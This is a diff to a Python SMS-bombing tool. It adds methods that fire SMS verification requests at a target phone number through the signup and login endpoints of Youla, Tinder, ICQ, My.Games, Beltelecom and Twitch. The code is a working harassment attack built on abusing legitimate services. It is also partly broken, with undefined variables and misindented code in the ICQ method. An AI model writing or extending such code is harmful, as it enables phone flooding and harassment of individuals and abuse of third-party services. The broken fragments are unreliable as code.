@@ -5,6 +5,7 @@ from bs4 import BeautifulSoup
 from colorama import Fore, Style
 from time import sleep
 from user_agent import generate_user_agent
+import urllib.request
 
 class SendSms():
     adet = 0
@@ -2437,4 +2438,50 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gokarma.app")
+    
+    #youla
+    def youla(self):
+        try:
+            print(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus}))
+        except:
+            print("Failed.")
+    
+    #gotinder
+    def gotinder(self):
+        try:
+            print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":numplus}))
+        except:
+            print("Failed.")
+    
+    #icq
+    def icq(self):
+        try:
+        print(requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num)))
+    except:
+        print("Failed.")
 
+    def accountmygames(self):
+        try:
+            print(requests.post('https://account.my.games/signup_send_sms/', data={'phone': _phone}))
+        except:
+            print("Failed.")
+
+    def beltelecom(self):
+        try:
+            print(requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}))
+        except:
+            print("Failed.")
+
+    def twitch(self):
+        try:
+            print(requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}))
+        except:
+            print("Failed.")
+    
+    def gotinder2(self):
+        try:
+            print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}))
+        except:
+            print("Failed.")
+    
+   
